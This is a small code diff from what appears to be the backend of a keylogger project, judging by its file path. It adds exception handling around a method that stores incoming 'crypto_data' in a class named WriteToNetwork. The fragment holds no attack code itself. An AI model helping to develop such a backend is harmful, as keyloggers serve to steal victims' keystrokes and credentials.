@@ -1,6 +1,8 @@
 import json
 import os
 from datetime import datetime
+from errors.erros_types import ErrorsTypes
+from exceptions.server_exception import ServerException
 
 base_directory = r"C:\devlopment\python\keyloggerProject\keyloggerBackend\data"
 
@@ -40,5 +42,9 @@ class WriteToNetwork:
         self.save_data(data)
 
     def write(self, crypto_data):
+        try:
+            self.add_entry(crypto_data)
+        except Exception as e:
+            raise ServerException(ErrorsTypes.GENERAL_ERROR, "There seems to be a problem, please try again later", e)
 
-        self.add_entry(crypto_data)
+
